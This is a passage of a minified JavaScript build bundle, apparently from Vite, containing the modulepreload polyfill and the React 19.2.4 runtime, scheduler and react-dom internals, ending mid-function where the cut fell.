(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))n(i);new MutationObserver(i=>{for(const r of i)if(r.type==="childList")for(const l of r.addedNodes)l.tagName==="LINK"&&l.rel==="modulepreload"&&n(l)}).observe(document,{childList:!0,subtree:!0});function t(i){const r={};return i.integrity&&(r.integrity=i.integrity),i.referrerPolicy&&(r.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?r.credentials="include":i.crossOrigin==="anonymous"?r.credentials="omit":r.credentials="same-origin",r}function n(i){if(i.ep)return;i.ep=!0;const r=t(i);fetch(i.href,r)}})();function pE(a){return a&&a.__esModule&&Object.prototype.hasOwnProperty.call(a,"default")?a.default:a}var Lv={exports:{}},id={};var Zx;function Yk(){if(Zx)return id;Zx=1;var a=Symbol.for("react.transitional.element"),e=Symbol.for("react.fragment");function t(n,i,r){var l=null;if(r!==void 0&&(l=""+r),i.key!==void 0&&(l=""+i.key),"key"in i){r={};for(var u in i)u!=="key"&&(r[u]=i[u])}else r=i;return i=r.ref,{$$typeof:a,type:n,key:l,ref:i!==void 0?i:null,props:r}}return id.Fragment=e,id.jsx=t,id.jsxs=t,id}var eA;function $k(){return eA||(eA=1,Lv.exports=Yk()),Lv.exports}var b=$k(),Rv={exports:{}},Ye={};var aA;function Xk(){if(aA)return Ye;aA=1;var a=Symbol.for("react.transitional.element"),e=Symbol.for("react.portal"),t=Symbol.for("react.fragment"),n=Symbol.for("react.strict_mode"),i=Symbol.for("react.profiler"),r=Symbol.for("react.consumer"),l=Symbol.for("react.context"),u=Symbol.for("react.forward_ref"),d=Symbol.for("react.suspense"),p=Symbol.for("react.memo"),f=Symbol.for("react.lazy"),h=Symbol.for("react.activity"),E=Symbol.iterator;function C(J){return J===null||typeof J!="object"?null:(J=E&&J[E]||J["@@iterator"],typeof J=="function"?J:null)}var A={isMounted:function(){return!1},enqueueForceUpdate:function(){},enqueueReplaceState:function(){},enqueueSetState:function(){}},j=Object.assign,R={};function I(J,de,B){this.props=J,this.context=de,this.refs=R,this.updater=B||A}I.prototype.isReactComponent={},I.prototype.setState=function(J,de){if(typeof J!="object"&&typeof J!="function"&&J!=null)throw Error("takes an object of state variables to update or a function which returns an object of state variables.");this.updater.enqueueSetState(this,J,de,"setState")},I.prototype.forceUpdate=function(J){this.updater.enqueueForceUpdate(this,J,"forceUpdate")};function w(){}w.prototype=I.prototype;function k(J,de,B){this.props=J,this.context=de,this.refs=R,this.updater=B||A}var Y=k.prototype=new w;Y.constructor=k,j(Y,I.prototype),Y.isPureReactComponent=!0;var ee=Array.isArray;function Q(){}var q={H:null,A:null,T:null,S:null},M=Object.prototype.hasOwnProperty;function N(J,de,B){var Re=B.ref;return{$$typeof:a,type:J,key:de,ref:Re!==void 0?Re:null,props:B}}function L(J,de){return N(J.type,de,J.props)}function _(J){return typeof J=="object"&&J!==null&&J.$$typeof===a}function V(J){var de={"=":"=0",":":"=2"};return"$"+J.replace(/[=:]/g,function(B){return de[B]})}var F=/\/+/g;function ce(J,de){return typeof J=="object"&&J!==null&&J.key!=null?V(""+J.key):de.toString(36)}function me(J){switch(J.status){case"fulfilled":return J.value;case"rejected":throw J.reason;default:switch(typeof J.status=="string"?J.then(Q,Q):(J.status="pending",J.then(function(de){J.status==="pending"&&(J.status="fulfilled",J.value=de)},function(de){J.status==="pending"&&(J.status="rejected",J.reason=de)})),J.status){case"fulfilled":return J.value;case"rejected":throw J.reason}}throw J}function Z(J,de,B,Re,Oe){var _e=typeof J;(_e==="undefined"||_e==="boolean")&&(J=null);var Xe=!1;if(J===null)Xe=!0;else switch(_e){case"bigint":case"string":case"number":Xe=!0;break;case"object":switch(J.$$typeof){case a:case e:Xe=!0;break;case f:return Xe=J._init,Z(Xe(J._payload),de,B,Re,Oe)}}if(Xe)return Oe=Oe(J),Xe=Re===""?"."+ce(J,0):Re,ee(Oe)?(B="",Xe!=null&&(B=Xe.replace(F,"$&/")+"/"),Z(Oe,de,B,"",function(St){return St})):Oe!=null&&(_(Oe)&&(Oe=L(Oe,B+(Oe.key==null||J&&J.key===Oe.key?"":(""+Oe.key).replace(F,"$&/")+"/")+Xe)),de.push(Oe)),1;Xe=0;var xa=Re===""?".":Re+":";if(ee(J))for(var ha=0;ha<J.length;ha++)Re=J[ha],_e=xa+ce(Re,ha),Xe+=Z(Re,de,B,_e,Oe);else if(ha=C(J),typeof ha=="function")for(J=ha.call(J),ha=0;!(Re=J.next()).done;)Re=Re.value,_e=xa+ce(Re,ha++),Xe+=Z(Re,de,B,_e,Oe);else if(_e==="object"){if(typeof J.then=="function")return Z(me(J),de,B,Re,Oe);throw de=String(J),Error("Objects are not valid as a React child (found: "+(de==="[object Object]"?"object with keys {"+Object.keys(J).join(", ")+"}":de)+"). If you meant to render a collection of children, use an array instead.")}return Xe}function re(J,de,B){if(J==null)return J;var Re=[],Oe=0;return Z(J,Re,"","",function(_e){return de.call(B,_e,Oe++)}),Re}function Ee(J){if(J._status===-1){var de=J._result;de=de(),de.then(function(B){(J._status===0||J._status===-1)&&(J._status=1,J._result=B)},function(B){(J._status===0||J._status===-1)&&(J._status=2,J._result=B)}),J._status===-1&&(J._status=0,J._result=de)}if(J._status===1)return J._result.default;throw J._result}var je=typeof reportError=="function"?reportError:function(J){if(typeof window=="object"&&typeof window.ErrorEvent=="function"){var de=new window.ErrorEvent("error",{bubbles:!0,cancelable:!0,message:typeof J=="object"&&J!==null&&typeof J.message=="string"?String(J.message):String(J),error:J});if(!window.dispatchEvent(de))return}else if(typeof process=="object"&&typeof process.emit=="function"){process.emit("uncaughtException",J);return}console.error(J)},G={map:re,forEach:function(J,de,B){re(J,function(){de.apply(this,arguments)},B)},count:function(J){var de=0;return re(J,function(){de++}),de},toArray:function(J){return re(J,function(de){return de})||[]},only:function(J){if(!_(J))throw Error("React.Children.only expected to receive a single React element child.");return J}};return Ye.Activity=h,Ye.Children=G,Ye.Component=I,Ye.Fragment=t,Ye.Profiler=i,Ye.PureComponent=k,Ye.StrictMode=n,Ye.Suspense=d,Ye.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=q,Ye.__COMPILER_RUNTIME={__proto__:null,c:function(J){return q.H.useMemoCache(J)}},Ye.cache=function(J){return function(){return J.apply(null,arguments)}},Ye.cacheSignal=function(){return null},Ye.cloneElement=function(J,de,B){if(J==null)throw Error("The argument must be a React element, but you passed "+J+".");var Re=j({},J.props),Oe=J.key;if(de!=null)for(_e in de.key!==void 0&&(Oe=""+de.key),de)!M.call(de,_e)||_e==="key"||_e==="__self"||_e==="__source"||_e==="ref"&&de.ref===void 0||(Re[_e]=de[_e]);var _e=arguments.length-2;if(_e===1)Re.children=B;else if(1<_e){for(var Xe=Array(_e),xa=0;xa<_e;xa++)Xe[xa]=arguments[xa+2];Re.children=Xe}return N(J.type,Oe,Re)},Ye.createContext=function(J){return J={$$typeof:l,_currentValue:J,_currentValue2:J,_threadCount:0,Provider:null,Consumer:null},J.Provider=J,J.Consumer={$$typeof:r,_context:J},J},Ye.createElement=function(J,de,B){var Re,Oe={},_e=null;if(de!=null)for(Re in de.key!==void 0&&(_e=""+de.key),de)M.call(de,Re)&&Re!=="key"&&Re!=="__self"&&Re!=="__source"&&(Oe[Re]=de[Re]);var Xe=arguments.length-2;if(Xe===1)Oe.children=B;else if(1<Xe){for(var xa=Array(Xe),ha=0;ha<Xe;ha++)xa[ha]=arguments[ha+2];Oe.children=xa}if(J&&J.defaultProps)for(Re in Xe=J.defaultProps,Xe)Oe[Re]===void 0&&(Oe[Re]=Xe[Re]);return N(J,_e,Oe)},Ye.createRef=function(){return{current:null}},Ye.forwardRef=function(J){return{$$typeof:u,render:J}},Ye.isValidElement=_,Ye.lazy=function(J){return{$$typeof:f,_payload:{_status:-1,_result:J},_init:Ee}},Ye.memo=function(J,de){return{$$typeof:p,type:J,compare:de===void 0?null:de}},Ye.startTransition=function(J){var de=q.T,B={};q.T=B;try{var Re=J(),Oe=q.S;Oe!==null&&Oe(B,Re),typeof Re=="object"&&Re!==null&&typeof Re.then=="function"&&Re.then(Q,je)}catch(_e){je(_e)}finally{de!==null&&B.types!==null&&(de.types=B.types),q.T=de}},Ye.unstable_useCacheRefresh=function(){return q.H.useCacheRefresh()},Ye.use=function(J){return q.H.use(J)},Ye.useActionState=function(J,de,B){return q.H.useActionState(J,de,B)},Ye.useCallback=function(J,de){return q.H.useCallback(J,de)},Ye.useContext=function(J){return q.H.useContext(J)},Ye.useDebugValue=function(){},Ye.useDeferredValue=function(J,de){return q.H.useDeferredValue(J,de)},Ye.useEffect=function(J,de){return q.H.useEffect(J,de)},Ye.useEffectEvent=function(J){return q.H.useEffectEvent(J)},Ye.useId=function(){return q.H.useId()},Ye.useImperativeHandle=function(J,de,B){return q.H.useImperativeHandle(J,de,B)},Ye.useInsertionEffect=function(J,de){return q.H.useInsertionEffect(J,de)},Ye.useLayoutEffect=function(J,de){return q.H.useLayoutEffect(J,de)},Ye.useMemo=function(J,de){return q.H.useMemo(J,de)},Ye.useOptimistic=function(J,de){return q.H.useOptimistic(J,de)},Ye.useReducer=function(J,de,B){return q.H.useReducer(J,de,B)},Ye.useRef=function(J){return q.H.useRef(J)},Ye.useState=function(J){return q.H.useState(J)},Ye.useSyncExternalStore=function(J,de,B){return q.H.useSyncExternalStore(J,de,B)},Ye.useTransition=function(){return q.H.useTransition()},Ye.version="19.2.4",Ye}var tA;function Hh(){return tA||(tA=1,Rv.exports=Xk()),Rv.exports}var U=Hh();const Go=pE(U);var Iv={exports:{}},od={},wv={exports:{}},jv={};var nA;function Zk(){return nA||(nA=1,(function(a){function e(Z,re){var Ee=Z.length;Z.push(re);e:for(;0<Ee;){var je=Ee-1>>>1,G=Z[je];if(0<i(G,re))Z[je]=re,Z[Ee]=G,Ee=je;else break e}}function t(Z){return Z.length===0?null:Z[0]}function n(Z){if(Z.length===0)return null;var re=Z[0],Ee=Z.pop();if(Ee!==re){Z[0]=Ee;e:for(var je=0,G=Z.length,J=G>>>1;je<J;){var de=2*(je+1)-1,B=Z[de],Re=de+1,Oe=Z[Re];if(0>i(B,Ee))Re<G&&0>i(Oe,B)?(Z[je]=Oe,Z[Re]=Ee,je=Re):(Z[je]=B,Z[de]=Ee,je=de);else if(Re<G&&0>i(Oe,Ee))Z[je]=Oe,Z[Re]=Ee,je=Re;else break e}}return re}function i(Z,re){var Ee=Z.sortIndex-re.sortIndex;return Ee!==0?Ee:Z.id-re.id}if(a.unstable_now=void 0,typeof performance=="object"&&typeof performance.now=="function"){var r=performance;a.unstable_now=function(){return r.now()}}else{var l=Date,u=l.now();a.unstable_now=function(){return l.now()-u}}var d=[],p=[],f=1,h=null,E=3,C=!1,A=!1,j=!1,R=!1,I=typeof setTimeout=="function"?setTimeout:null,w=typeof clearTimeout=="function"?clearTimeout:null,k=typeof setImmediate<"u"?setImmediate:null;function Y(Z){for(var re=t(p);re!==null;){if(re.callback===null)n(p);else if(re.startTime<=Z)n(p),re.sortIndex=re.expirationTime,e(d,re);else break;re=t(p)}}function ee(Z){if(j=!1,Y(Z),!A)if(t(d)!==null)A=!0,Q||(Q=!0,V());else{var re=t(p);re!==null&&me(ee,re.startTime-Z)}}var Q=!1,q=-1,M=5,N=-1;function L(){return R?!0:!(a.unstable_now()-N<M)}function _(){if(R=!1,Q){var Z=a.unstable_now();N=Z;var re=!0;try{e:{A=!1,j&&(j=!1,w(q),q=-1),C=!0;var Ee=E;try{a:{for(Y(Z),h=t(d);h!==null&&!(h.expirationTime>Z&&L());){var je=h.callback;if(typeof je=="function"){h.callback=null,E=h.priorityLevel;var G=je(h.expirationTime<=Z);if(Z=a.unstable_now(),typeof G=="function"){h.callback=G,Y(Z),re=!0;break a}h===t(d)&&n(d),Y(Z)}else n(d);h=t(d)}if(h!==null)re=!0;else{var J=t(p);J!==null&&me(ee,J.startTime-Z),re=!1}}break e}finally{h=null,E=Ee,C=!1}re=void 0}}finally{re?V():Q=!1}}}var V;if(typeof k=="function")V=function(){k(_)};else if(typeof MessageChannel<"u"){var F=new MessageChannel,ce=F.port2;F.port1.onmessage=_,V=function(){ce.postMessage(null)}}else V=function(){I(_,0)};function me(Z,re){q=I(function(){Z(a.unstable_now())},re)}a.unstable_IdlePriority=5,a.unstable_ImmediatePriority=1,a.unstable_LowPriority=4,a.unstable_NormalPriority=3,a.unstable_Profiling=null,a.unstable_UserBlockingPriority=2,a.unstable_cancelCallback=function(Z){Z.callback=null},a.unstable_forceFrameRate=function(Z){0>Z||125<Z?console.error("forceFrameRate takes a positive int between 0 and 125, forcing frame rates higher than 125 fps is not supported"):M=0<Z?Math.floor(1e3/Z):5},a.unstable_getCurrentPriorityLevel=function(){return E},a.unstable_next=function(Z){switch(E){case 1:case 2:case 3:var re=3;break;default:re=E}var Ee=E;E=re;try{return Z()}finally{E=Ee}},a.unstable_requestPaint=function(){R=!0},a.unstable_runWithPriority=function(Z,re){switch(Z){case 1:case 2:case 3:case 4:case 5:break;default:Z=3}var Ee=E;E=Z;try{return re()}finally{E=Ee}},a.unstable_scheduleCallback=function(Z,re,Ee){var je=a.unstable_now();switch(typeof Ee=="object"&&Ee!==null?(Ee=Ee.delay,Ee=typeof Ee=="number"&&0<Ee?je+Ee:je):Ee=je,Z){case 1:var G=-1;break;case 2:G=250;break;case 5:G=1073741823;break;case 4:G=1e4;break;default:G=5e3}return G=Ee+G,Z={id:f++,callback:re,priorityLevel:Z,startTime:Ee,expirationTime:G,sortIndex:-1},Ee>je?(Z.sortIndex=Ee,e(p,Z),t(d)===null&&Z===t(p)&&(j?(w(q),q=-1):j=!0,me(ee,Ee-je))):(Z.sortIndex=G,e(d,Z),A||C||(A=!0,Q||(Q=!0,V()))),Z},a.unstable_shouldYield=L,a.unstable_wrapCallback=function(Z){var re=E;return function(){var Ee=E;E=re;try{return Z.apply(this,arguments)}finally{E=Ee}}}})(jv)),jv}var iA;function e3(){return iA||(iA=1,wv.exports=Zk()),wv.exports}var Dv={exports:{}},Bt={};var oA;function a3(){if(oA)return Bt;oA=1;var a=Hh();function e(d){var p="https://react.dev/errors/"+d;if(1<arguments.length){p+="?args[]="+encodeURIComponent(arguments[1]);for(var f=2;f<arguments.length;f++)p+="&args[]="+encodeURIComponent(arguments[f])}return"Minified React error #"+d+"; visit "+p+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function t(){}var n={d:{f:t,r:function(){throw Error(e(522))},D:t,C:t,L:t,m:t,X:t,S:t,M:t},p:0,findDOMNode:null},i=Symbol.for("react.portal");function r(d,p,f){var h=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:i,key:h==null?null:""+h,children:d,containerInfo:p,implementation:f}}var l=a.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE;function u(d,p){if(d==="font")return"";if(typeof p=="string")return p==="use-credentials"?p:""}return Bt.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE=n,Bt.createPortal=function(d,p){var f=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!p||p.nodeType!==1&&p.nodeType!==9&&p.nodeType!==11)throw Error(e(299));return r(d,p,null,f)},Bt.flushSync=function(d){var p=l.T,f=n.p;try{if(l.T=null,n.p=2,d)return d()}finally{l.T=p,n.p=f,n.d.f()}},Bt.preconnect=function(d,p){typeof d=="string"&&(p?(p=p.crossOrigin,p=typeof p=="string"?p==="use-credentials"?p:"":void 0):p=null,n.d.C(d,p))},Bt.prefetchDNS=function(d){typeof d=="string"&&n.d.D(d)},Bt.preinit=function(d,p){if(typeof d=="string"&&p&&typeof p.as=="string"){var f=p.as,h=u(f,p.crossOrigin),E=typeof p.integrity=="string"?p.integrity:void 0,C=typeof p.fetchPriority=="string"?p.fetchPriority:void 0;f==="style"?n.d.S(d,typeof p.precedence=="string"?p.precedence:void 0,{crossOrigin:h,integrity:E,fetchPriority:C}):f==="script"&&n.d.X(d,{crossOrigin:h,integrity:E,fetchPriority:C,nonce:typeof p.nonce=="string"?p.nonce:void 0})}},Bt.preinitModule=function(d,p){if(typeof d=="string")if(typeof p=="object"&&p!==null){if(p.as==null||p.as==="script"){var f=u(p.as,p.crossOrigin);n.d.M(d,{crossOrigin:f,integrity:typeof p.integrity=="string"?p.integrity:void 0,nonce:typeof p.nonce=="string"?p.nonce:void 0})}}else p==null&&n.d.M(d)},Bt.preload=function(d,p){if(typeof d=="string"&&typeof p=="object"&&p!==null&&typeof p.as=="string"){var f=p.as,h=u(f,p.crossOrigin);n.d.L(d,f,{crossOrigin:h,integrity:typeof p.integrity=="string"?p.integrity:void 0,nonce:typeof p.nonce=="string"?p.nonce:void 0,type:typeof p.type=="string"?p.type:void 0,fetchPriority:typeof p.fetchPriority=="string"?p.fetchPriority:void 0,referrerPolicy:typeof p.referrerPolicy=="string"?p.referrerPolicy:void 0,imageSrcSet:typeof p.imageSrcSet=="string"?p.imageSrcSet:void 0,imageSizes:typeof p.imageSizes=="string"?p.imageSizes:void 0,media:typeof p.media=="string"?p.media:void 0})}},Bt.preloadModule=function(d,p){if(typeof d=="string")if(p){var f=u(p.as,p.crossOrigin);n.d.m(d,{as:typeof p.as=="string"&&p.as!=="script"?p.as:void 0,crossOrigin:f,integrity:typeof p.integrity=="string"?p.integrity:void 0})}else n.d.m(d)},Bt.requestFormReset=function(d){n.d.r(d)},Bt.unstable_batchedUpdates=function(d,p){return d(p)},Bt.useFormState=function(d,p,f){return l.H.useFormState(d,p,f)},Bt.useFormStatus=function(){return l.H.useHostTransitionStatus()},Bt.version="19.2.4",Bt}var sA;function t3(){if(sA)return Dv.exports;sA=1;function a(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(a)}catch(e){console.error(e)}}return a(),Dv.exports=a3(),Dv.exports}var rA;function n3(){if(rA)return od;rA=1;var a=e3(),e=Hh(),t=t3();function n(o){var s="https://react.dev/errors/"+o;if(1<arguments.length){s+="?args[]="+encodeURIComponent(arguments[1]);for(var c=2;c<arguments.length;c++)s+="&args[]="+encodeURIComponent(arguments[c])}return"Minified React error #"+o+"; visit "+s+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}function i(o){return!(!o||o.nodeType!==1&&o.nodeType!==9&&o.nodeType!==11)}function r(o){var s=o,c=o;if(o.alternate)for(;s.return;)s=s.return;else{o=s;do s=o,(s.flags&4098)!==0&&(c=s.return),o=s.return;while(o)}return s.tag===3?c:null}function l(o){if(o.tag===13){var s=o.memoizedState;if(s===null&&(o=o.alternate,o!==null&&(s=o.memoizedState)),s!==null)return s.dehydrated}return null}function u(o){if(o.tag===31){var s=o.memoizedState;if(s===null&&(o=o.alternate,o!==null&&(s=o.memoizedState)),s!==null)return s.dehydrated}return null}function d(o){if(r(o)!==o)throw Error(n(188))}function p(o){var s=o.alternate;if(!s){if(s=r(o),s===null)throw Error(n(188));return s!==o?null:o}for(var c=o,m=s;;){var v=c.return;if(v===null)break;var y=v.alternate;if(y===null){if(m=v.return,m!==null){c=m;continue}break}if(v.child===y.child){for(y=v.child;y;){if(y===c)return d(v),o;if(y===m)return d(v),s;y=y.sibling}throw Error(n(188))}if(c.return!==m.return)c=v,m=y;else{for(var x=!1,D=v.child;D;){if(D===c){x=!0,c=v,m=y;break}if(D===m){x=!0,m=v,c=y;break}D=D.sibling}if(!x){for(D=y.child;D;){if(D===c){x=!0,c=y,m=v;break}if(D===m){x=!0,m=y,c=v;break}D=D.sibling}if(!x)throw Error(n(189))}}if(c.alternate!==m)throw Error(n(190))}if(c.tag!==3)throw Error(n(188));return c.stateNode.current===c?o:s}function f(o){var s=o.tag;if(s===5||s===26||s===27||s===6)return o;for(o=o.child;o!==null;){if(s=f(o),s!==null)return s;o=o.sibling}return null}var h=Object.assign,E=Symbol.for("react.element"),C=Symbol.for("react.transitional.element"),A=Symbol.for("react.portal"),j=Symbol.for("react.fragment"),R=Symbol.for("react.strict_mode"),I=Symbol.for("react.profiler"),w=Symbol.for("react.consumer"),k=Symbol.for("react.context"),Y=Symbol.for("react.forward_ref"),ee=Symbol.for("react.suspense"),Q=Symbol.for("react.suspense_list"),q=Symbol.for("react.memo"),M=Symbol.for("react.lazy"),N=Symbol.for("react.activity"),L=Symbol.for("react.memo_cache_sentinel"),_=Symbol.iterator;function V(o){return o===null||typeof o!="object"?null:(o=_&&o[_]||o["@@iterator"],typeof o=="function"?o:null)}var F=Symbol.for("react.client.reference");function ce(o){if(o==null)return null;if(typeof o=="function")return o.$$typeof===F?null:o.displayName||o.name||null;if(typeof o=="string")return o;switch(o){case j:return"Fragment";case I:return"Profiler";case R:return"StrictMode";case ee:return"Suspense";case Q:return"SuspenseList";case N:return"Activity"}if(typeof o=="object")switch(o.$$typeof){case A:return"Portal";case k:return o.displayName||"Context";case w:return(o._context.displayName||"Context")+".Consumer";case Y:var s=o.render;return o=o.displayName,o||(o=s.displayName||s.name||"",o=o!==""?"ForwardRef("+o+")":"ForwardRef"),o;case q:return s=o.displayName||null,s!==null?s:ce(o.type)||"Memo";case M:s=o._payload,o=o._init;try{return ce(o(s))}catch{}}return null}var me=Array.isArray,Z=e.__CLIENT_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,re=t.__DOM_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE,Ee={pending:!1,data:null,method:null,action:null},je=[],G=-1;function J(o){return{current:o}}function de(o){0>G||(o.current=je[G],je[G]=null,G--)}function B(o,s){G++,je[G]=o.current,o.current=s}var Re=J(null),Oe=J(null),_e=J(null),Xe=J(null);function xa(o,s){switch(B(_e,s),B(Oe,o),B(Re,null),s.nodeType){case 9:case 11:o=(o=s.documentElement)&&(o=o.namespaceURI)?Cx(o):0;break;default:if(o=s.tagName,s=s.namespaceURI)s=Cx(s),o=Tx(s,o);else switch(o){case"svg":o=1;break;case"math":o=2;break;default:o=0}}de(Re),B(Re,o)}function ha(){de(Re),de(Oe),de(_e)}function St(o){o.memoizedState!==null&&B(Xe,o);var s=Re.current,c=Tx(s,o.type);s!==c&&(B(Oe,o),B(Re,c))}function tn(o){Oe.current===o&&(de(Re),de(Oe)),Xe.current===o&&(de(Xe),ed._currentValue=Ee)}var Ve,ti;function nn(o){if(Ve===void 0)try{throw Error()}catch(c){var s=c.stack.trim().match(/\n( *(at )?)/);Ve=s&&s[1]||"",ti=-1<c.stack.indexOf(`
    at`)?" (<anonymous>)":-1<c.stack.indexOf("@")?"@unknown:0:0":""}return`
`+Ve+o+ti}var Ii=!1;function on(o,s){if(!o||Ii)return"";Ii=!0;var c=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{var m={DetermineComponentFrameRoot:function(){try{if(s){var be=function(){throw Error()};if(Object.defineProperty(be.prototype,"props",{set:function(){throw Error()}}),typeof Reflect=="object"&&Reflect.construct){try{Reflect.construct(be,[])}catch(ue){var se=ue}Reflect.construct(o,[],be)}else{try{be.call()}catch(ue){se=ue}o.call(be.prototype)}}else{try{throw Error()}catch(ue){se=ue}(be=o())&&typeof be.catch=="function"&&be.catch(function(){})}}catch(ue){if(ue&&se&&typeof ue.stack=="string")return[ue.stack,se.stack]}return[null,null]}};m.DetermineComponentFrameRoot.displayName="DetermineComponentFrameRoot";var v=Object.getOwnPropertyDescriptor(m.DetermineComponentFrameRoot,"name");v&&v.configurable&&Object.defineProperty(m.DetermineComponentFrameRoot,"name",{value:"DetermineComponentFrameRoot"});var y=m.DetermineComponentFrameRoot(),x=y[0],D=y[1];if(x&&D){var K=x.split(`
`),oe=D.split(`
`);for(v=m=0;m<K.length&&!K[m].includes("DetermineComponentFrameRoot");)m++;for(;v<oe.length&&!oe[v].includes("DetermineComponentFrameRoot");)v++;if(m===K.length||v===oe.length)for(m=K.length-1,v=oe.length-1;1<=m&&0<=v&&K[m]!==oe[v];)v--;for(;1<=m&&0<=v;m--,v--)if(K[m]!==oe[v]){if(m!==1||v!==1)do if(m--,v--,0>v||K[m]!==oe[v]){var he=`
`+K[m].replace(" at new "," at ");return o.displayName&&he.includes("<anonymous>")&&(he=he.replace("<anonymous>",o.displayName)),he}while(1<=m&&0<=v);break}}}finally{Ii=!1,Error.prepareStackTrace=c}return(c=o?o.displayName||o.name:"")?nn(c):""}function Nn(o,s){switch(o.tag){case 26:case 27:case 5:return nn(o.type);case 16:return nn("Lazy");case 13:return o.child!==s&&s!==null?nn("Suspense Fallback"):nn("Suspense");case 19:return nn("SuspenseList");case 0:case 15:return on(o.type,!1);case 11:return on(o.type.render,!1);case 1:return on(o.type,!0);case 31:return nn("Activity");default:return""}}function mo(o){try{var s="",c=null;do s+=Nn(o,c),c=o,o=o.return;while(o);return s}catch(m){return`
Error generating stack: `+m.message+`
`+m.stack}}var qa=Object.prototype.hasOwnProperty,za=a.unstable_scheduleCallback,Ba=a.unstable_cancelCallback,zt=a.unstable_shouldYield,fo=a.unstable_requestPaint,ht=a.unstable_now,ni=a.unstable_getCurrentPriorityLevel,fe=a.unstable_ImmediatePriority,Pe=a.unstable_UserBlockingPriority,X=a.unstable_NormalPriority,ye=a.unstable_LowPriority,we=a.unstable_IdlePriority,Ae=a.log,Qe=a.unstable_setDisableYieldValue,ma=null,ra=null;function ya(o){if(typeof Ae=="function"&&Qe(o),ra&&typeof ra.setStrictMode=="function")try{ra.setStrictMode(ma,o)}catch{}}var We=Math.clz32?Math.clz32:Vp,jt=Math.log,Ct=Math.LN2;function Vp(o){return o>>>=0,o===0?32:31-(jt(o)/Ct|0)|0}var wi=256,dr=262144,nt=4194304;function ji(o){var s=o&42;if(s!==0)return s;switch(o&-o){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:return 64;case 128:return 128;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:return o&261888;case 262144:case 524288:case 1048576:case 2097152:return o&3932160;case 4194304:case 8388608:case 16777216:case 33554432:return o&62914560;case 67108864:return 67108864;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 0;default:return o}}function Di(o,s,c){var m=o.pendingLanes;if(m===0)return 0;var v=0,y=o.suspendedLanes,x=o.pingedLanes;o=o.warmLanes;var D=m&134217727;return D!==0?(m=D&~y,m!==0?v=ji(m):(x&=D,x!==0?v=ji(x):c||(c=D&~o,c!==0&&(v=ji(c))))):(D=m&~y,D!==0?v=ji(D):x!==0?v=ji(x):c||(c=m&~o,c!==0&&(v=ji(c)))),v===0?0:s!==0&&s!==v&&(s&y)===0&&(y=v&-v,c=s&-s,y>=c||y===32&&(c&4194048)!==0)?s:v}function ii(o,s){return(o.pendingLanes&~(o.suspendedLanes&~o.pingedLanes)&s)===0}function jg(o,s){switch(o){case 1:case 2:case 4:case 8:case 64:return s+250;case 16:case 32:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return s+5e3;case 4194304:case 8388608:case 16777216:case 33554432:return-1;case 67108864:case 134217728:case 268435456:case 536870912:case 1073741824:return-1;default:return-1}}function Hp(){var o=nt;return nt<<=1,(nt&62914560)===0&&(nt=4194304),o}function Mi(o){for(var s=[],c=0;31>c;c++)s.push(o);return s}function pr(o,s){o.pendingLanes|=s,s!==268435456&&(o.suspendedLanes=0,o.pingedLanes=0,o.warmLanes=0)}function Dg(o,s,c,m,v,y){var x=o.pendingLanes;o.pendingLanes=c,o.suspendedLanes=0,o.pingedLanes=0,o.warmLanes=0,o.expiredLanes&=c,o.entangledLanes&=c,o.errorRecoveryDisabledLanes&=c,o.shellSuspendCounter=0;var D=o.entanglements,K=o.expirationTimes,oe=o.hiddenUpdates;for(c=x&~c;0<c;){var he=31-We(c),be=1<<he;D[he]=0,K[he]=-1;var se=oe[he];if(se!==null)for(oe[he]=null,he=0;he<se.length;he++){var ue=se[he];ue!==null&&(ue.lane&=-536870913)}c&=~be}m!==0&&mr(o,m,0),y!==0&&v===0&&o.tag!==0&&(o.suspendedLanes|=y&~(x&~s))}function mr(o,s,c){o.pendingLanes|=s,o.suspendedLanes&=~s;var m=31-We(s);o.entangledLanes|=s,o.entanglements[m]=o.entanglements[m]|1073741824|c&261930}function ou(o,s){var c=o.entangledLanes|=s;for(o=o.entanglements;c;){var m=31-We(c),v=1<<m;v&s|o[m]&s&&(o[m]|=s),c&=~v}}function su(o,s){var c=s&-s;return c=(c&42)!==0?1:fr(c),(c&(o.suspendedLanes|s))!==0?0:c}function fr(o){switch(o){case 2:o=1;break;case 8:o=4;break;case 32:o=16;break;case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:o=128;break;case 268435456:o=134217728;break;default:o=0}return o}function ho(o){return o&=-o,2<o?8<o?(o&134217727)!==0?32:268435456:8:2}function Gp(){var o=re.p;return o!==0?o:(o=window.event,o===void 0?32:Qx(o.type))}function oi(o,s){var c=re.p;try{return re.p=o,s()}finally{re.p=c}}var si=Math.random().toString(36).slice(2),it="__reactFiber$"+si,Tt="__reactProps$"+si,Ni="__reactContainer$"+si,bl="__reactEvents$"+si,Mg="__reactListeners$"+si,Qp="__reactHandles$"+si,Jp="__reactResources$"+si,_i="__reactMarker$"+si;function vl(o){delete o[it],delete o[Tt],delete o[bl],delete o[Mg],delete o[Qp]}function qi(o){var 